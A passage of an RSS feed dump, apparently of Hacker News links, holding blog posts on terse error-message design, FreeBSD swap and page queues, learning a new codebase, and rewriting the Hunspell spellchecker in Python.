January 15, 2021 | https://tilde.team/~kiedtl/blog/chatterbox/ | <a href="https://web.archive.org/web/*/https://tilde.team/~kiedtl/blog/chatterbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<a id="homelink" href="https://tilde.team/~kiedtl/">‚üµ Back</a><hr>


<p>Let's compare some error messages -- specifically, the ones that occur when
you try to execute a nonexistant command in Windows PowerShell and GNU
Bash.</p>
<p>PowerShell:</p>
<pre><code>PS C:\&gt; lorem --ipsum dolor -sit amet
lorem : The term 'lorem' is not recognized as the name of a cmdlet, function, script file, or operable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ lorem --ipsum dolor -sit amet
+ ~~~~~
+ CategoryInfo          : ObjectNotFound: (lorem:String) [], CommandNotFoundException
+ FullyQualifiedErrorId : CommandNotFoundException

PS C:\&gt; exit
</code></pre>
<p>and GNU Bash:</p>
<pre><code>$ lorem --ipsum dolor -sit amet
bash: lorem: command not found
$ 
</code></pre>
<p>The first thing you'll notice is that PowerShell's output is far, <em>far</em>
more verbose. You've got an error, a nice helpful message suggesting that
you "check the spelling of the name and try again", and a stack trace.
Meanwhile, <code>bash</code> just tells you <code>command not found</code>.</p>
<p>So: which error message is better?</p>
<p>Eric Raymond, in his excellent book <em>The Art of UNIX Programming</em>, explains
that a good UNIX program should output the least amount of stuff that it
can, a rule he calls the "Rule of Silence":</p>
<blockquote>
<p>One of Unix's oldest and most persistent design rules is that when a
program has nothing interesting or surprising to say, it should <em>shut
up</em>. Well-behaved Unix programs do their jobs unobtrusively, with a
minimum of fuss and bother. Silence is golden.</p>
<p>This "silence is golden" rule eveolved originally because Unix predates
video displays. On the slow printing terminals of 1969, each line of
unnecessary output was a serious drain on the user's time. That
constraint is gone, but excellent reasons for terseness remain. (Raymond,
43)</p>
</blockquote>
<p>He quotes Ken Arnold:</p>
<blockquote>
<p>...important information should not be mixed in with verbosity about
internal program behaviour. If all displayed information is important,
important information is easy to find.</p>
</blockquote>
<p>Raymond continues:</p>
<blockquote>
<p>Well designed programs treat the user's attention and concentration as a
previous and limited resource, only to be claimed when necessary.
(Raymond, 44)</p>
</blockquote>
<p>It is Arnold's quote that I'd like to expand on. Not only should you not
include unimportant information, but you should also output the important
stuff in the tersest possible form.</p>
<p>Why? Because <strong>users don't like reading.</strong></p>
<p>When a user is using a particular application, they are usually trying to
get something done. They may be trying to check their email, launch an IM
client, or start their browser. Reading stuff takes time, and thus slows
the user down. Because of this, users will do the minimal amount of reading
that they can.</p>
<p>Therefore, a terse error message is more likely to get properly read than a
verbose error.</p>
<p>"But wait! PowerShell's message is more user-friendly, because it reminds
the user to check their spelling!" Pffft. Anyone smart (for lack of a
better word!) enough to use PowerShell will know that they should
double-check their spelling without an error message telling them to do so.</p>
<p>And even in "normal" applications -- where the majority of users are not
knowledgable enough to know that their spelling could be to blame -- an
error message that's too verbose is <em>still</em> problematic, because many, if
not most, non-techy users won't bother reading it!</p>
<p>And if you <em>simply must include</em> a help/hint message -- do so in a way that
won't distract the user from the actual error.</p>
<p>For example, just look at the default Windows error message for an
incorrect password:</p>
<blockquote>
<p>You can't sign into your device right now. Go to account.live.com to fix
the problem, or try the last password you used on this device.</p>
</blockquote>
<p>Now, this could have just been written as</p>
<blockquote>
<p>Login incorrect</p>
</blockquote>
<p>which is the error message that's displayed on Linux when a user attempts
to login from a TTY.</p>
<p>However: a "Windows account" is actually a Microsoft account, and the
password is the same. Which means that if a user changes her Microsoft
account password on another device, and then tries to login on another
device that hasn't connected to the internet yet and received the new
password, she will have to use the last password she used on that
particular device.</p>
<p>Most users, however, probably won't realize this in such
a scenario, so it's OK to say that in the error message. The trick is to
include it in such a way so as to not make the error message seem too long:</p>
<blockquote>
<p><strong>Incorrect password</strong></p>
<hr>
<p><em>Note: try using the last password you used on this device.</em></p>
</blockquote>
<p>Notice how the main error ("Incorrect password") is in bold, and the hint,
two lines below, was in italics. I didn't put the hint in
<small>small</small> text, because that would give the impression to a
naive user that it was some kind of legal/technical message that she
doesn't have to pay attention to.</p>
<h2 id="anti-case-studies">(anti-)case studies</h2>
<h3 id="google">Google</h3>
<p>Take a look at the error message given when your Google search didn't turn
up anything:</p>
<blockquote>
<p>Your search -- <strong>asdf;asdf;asdf;asdf;asdf;asdf;as...</strong> did not match any
documents.</p>
<p>Suggestions:</p>
<ul>
<li>Make sure all words are spelled correctly.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>For one thing, repeating the entire search query in bold isn't necessary.
The user already knows what they searched for.</p>
<p>The suggestions, however,
are OK since they are visually separate from the error.</p>
<p>Fixed:</p>
<blockquote>
<p><strong>No results found.</strong></p>
<hr>
<p>Tips:</p>
<ul>
<li>Check your spelling.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>Notice how I condensed the main error message and the first suggestion,
and replaced <code>Suggestions:</code> with <code>Tips:</code>.</p>
<h3 id="ssh">SSH</h3>
<pre><code>$ ssh tilde.zone
The authenticity of host 'tilde.zone (51.79.32.49)' can't be established.
ECDSA key fingerprint is SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'tilde.zone,51.79.32.49' (ECDSA) to the list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, please try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>I see several things wrong:</p>
<ul>
<li>the first line (<code>The authenticity of host can't be established</code>) is too verbose.</li>
<li>the second line (<code>ECDSA key fingerprint is...</code>) is too verbose.</li>
<li>the prompt to continue to way too verbose.</li>
<li>the warning is too verbose.</li>
<li>the <code>permission denied</code> error is just a little bit too verbose.</li>
</ul>
<p>Fixed:</p>
<pre><code>$ ssh tilde.zone
Authenticity of 'tilde.zone (51.79.32.49)' unknown.
ECDSA key fingerprint: SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc
Continue? (yes/no) yes
Warning: added host to list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>As you can see, I've condensed the first line, continue prompt, and warning
quite a bit; I've also changed the second line to not be a sentence, thus
eliminating a whole two letter word ;)</p>
<p>The warning has been changed to not repeat the host and ip address, which
was already listed previously. The completely unnecessary <code>please</code>
has been removed from the password error.</p>
<h3 id="su"><code>su</code></h3>
<p>The example with the shortest name also has the shortest error message,
<code>su</code>:</p>
<pre><code>$ su
Password:
su: Authentication failure
</code></pre>
<p>Notice the beautifully terse error message.</p>
<p>(And if you're wondering why <code>su</code> just doesn't say <code>incorrect password</code>,
it's probably due to <code>su</code> being incapable of knowing whether it's really
the password that was wrong, or the username, or something else.)</p>
<h3 id="gnu-cat">GNU <code>cat</code></h3>
<p><code>cat</code>'s error on an incorrect path is terse, but not terse enough:</p>
<pre><code>$ cat invalid
cat: invalid: No such file or directory
$
</code></pre>
<p>Why say "no such file or directory"? <code>cat</code> doesn't even read directories!</p>
<p>Solution:</p>
<pre><code>$ cat invalid
cat: invalid: invalid path
</code></pre>
<p><em>more case studies will be added as I find them.</em></p>
<h2 id="conclusion">conclusion</h2>
<p>Terser is better. Software isn't the place to show off your writing skills.</p>
<p>And if you really must include some kind of hint or suggestion, make it
visually separate from the error message.</p>





<br><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAIAAAD8q9/YAAAABGdBTUEAANbY1E9YMgAAAZ9JREFUSMflljFrwkAUx98H6J3N6KbXFjtJJZNIB+Ntds0kdIxDp3boTYJ0UDcLutxXOCfbpejQSRE5+g38CvcVrtCTNJVLiFAKaR4ZwvH+yf3yf+/lAHIYOjfxDTybi+jVvesCwGg0ssoopRjjKZ+Y5O3HtnBayISvduApn2CM42hD5splxeQv3hf9fj/DwI3rRrlcTq4NKSUAdG47RrKRm/ZNO6vACCNjr5SSEAIAlFKlFKUUAAghUkpjcs2thVU9fh5b58Lhy37eWxejKmtynOSwV9MA9556ALBcLrXWhBDf97XW7Cscx1FKcc6FEGYRYRRW9Wq9sj794CZhN3GZvyWxAz883gOAlFIpFZ1bvu+7rhutasYYxtioXt9e1tt1gsNWT+J2HPdp0kuOALY6TCkNgsA4zBjjnO8dRkc4nOCVtYzTOHyUJL6H0b6HhRCO4wBAEARhD7uuu9vttNatVqt6VU3Zw+mB/7qHZ3NRb9RLpVKOpvSUTxA6GQ6HCcCe551fnP2T/3A4ugaDgZW26TWLxWK2T1r5OkvnKj4Bfm7H+J/sGfMAAAAASUVORK5CYII="></a>
<br>


</div></div>]]>
            </description>
            <link>https://tilde.team/~kiedtl/blog/chatterbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789837</guid>
            <pubDate>Fri, 15 Jan 2021 11:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring Swap on FreeBSD]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25789809">thread link</a>) | @rodrigo975
<br/>
January 15, 2021 | https://klarasystems.com/articles/exploring-swap-on-freebsd/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/exploring-swap-on-freebsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, ‚Äú<em>swapping</em>‚Äù refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common ‚Äúsolution‚Äù is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU ‚Äì it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system‚Äôs memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>‚Äú<em>Wired</em>‚Äù pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process‚Äô address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the ‚Äúpage daemon‚Äù periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be ‚Äúdirty‚Äù and before it can be reused its contents must be paged out to storage. Otherwise, the page is ‚Äúclean.‚Äù For example, if one searches a file using grep(1), that file‚Äôs data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>



<div><figure><img data-attachment-id="3546" data-permalink="https://klarasystems.com/articles/exploring-swap-on-freebsd/image-4/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" data-orig-size="340,270" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=300%2C238&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" loading="lazy" width="340" height="270" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=340%2C270&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?w=340&amp;ssl=1 340w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=300%2C238&amp;ssl=1 300w" sizes="(max-width: 340px) 100vw, 340px" data-recalc-dims="1"></figure></div>



<p><strong>To summarize:</strong></p>



<p>‚Äì The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>‚Äì To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>‚Äì When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>‚Äì If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control ‚Äúbackground‚Äù laundering, while the third is used to drive ‚Äúshortfall‚Äù laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page‚Äôs contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page‚Äôs contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean ‚Äì only if the data is written to will the page be marked dirty ‚Äì so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system ‚Äì the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://klarasystems.com/articles/exploring-swap-on-freebsd/">https://klarasystems.com/articles/exploring-swap-on-freebsd/</a></em></p>]]>
            </description>
            <link>https://klarasystems.com/articles/exploring-swap-on-freebsd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789809</guid>
            <pubDate>Fri, 15 Jan 2021 11:53:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Merge timeline of all payment providers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789403">thread link</a>) | @kinduff
<br/>
January 15, 2021 | https://fabien.mornand.name/payment/ | <a href="https://web.archive.org/web/*/https://fabien.mornand.name/payment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://fabien.mornand.name/payment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789403</guid>
            <pubDate>Fri, 15 Jan 2021 11:01:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to join a team and learn a codebase (2020)]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 51 (<a href="https://news.ycombinator.com/item?id=25789336">thread link</a>) | @minicaionut
<br/>
January 15, 2021 | https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html | <a href="https://web.archive.org/web/*/https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you‚Äôll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you‚Äôre running and packages you‚Äôre installing. You‚Äôre bound to run into something that‚Äôs changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</a></em></p>]]>
            </description>
            <link>https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789336</guid>
            <pubDate>Fri, 15 Jan 2021 10:54:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25789099">thread link</a>) | @zverok
<br/>
January 15, 2021 | https://zverok.github.io/blog/2021-01-05-spellchecker-1.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a ‚Äúweekend project‚Äù: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could‚Äôve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that‚Äôs not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library‚Äîwhich is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

<p>The dictionaries looked like easy to reuse text files with some (‚Äúinsignificant‚Äù as it seemed) metadata, and the whole ‚Äúuse Hunspell dictionaries from pure Ruby spellchecker‚Äù project <em>still</em> felt like a ‚Äúweekend-long‚Äù one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: ‚Äúexplanatory rewrite‚Äù of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell‚Äôs core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I‚Äôll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to ‚Äúexplain‚Äù it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than ‚Äújust look in the list of the known words‚Äù</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
